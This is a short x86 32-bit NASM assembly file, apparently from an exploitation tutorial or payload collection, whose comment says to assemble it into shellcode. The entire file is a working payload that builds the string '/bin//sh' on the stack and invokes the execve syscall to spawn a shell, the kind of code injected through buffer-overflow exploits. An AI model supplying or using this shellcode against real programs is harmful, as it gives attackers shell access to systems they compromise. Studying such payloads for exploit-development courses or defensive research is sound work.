; Use nasm sh.s to get Shellcode
BITS 32

_start:

  xor eax, eax          ;
  push eax              ; Push null for string termination
  push 0x68732f2f       ; Push "//sh" to the stack
  push 0x6e69622f       ; Push "/bin" to the stack
  mov ebx, esp          ; Put adress of "/bin//sh" into ebx
  push eax              ; push 32-bit terminator to the stack
  mov edx, esp          ; Empty array pointer
  push ebx              ; Push string adress to stack
  mov ecx, esp          ; argv array with string ptr
  mov al, 11            ; Syscall #11
  int 0x80              ; Do it
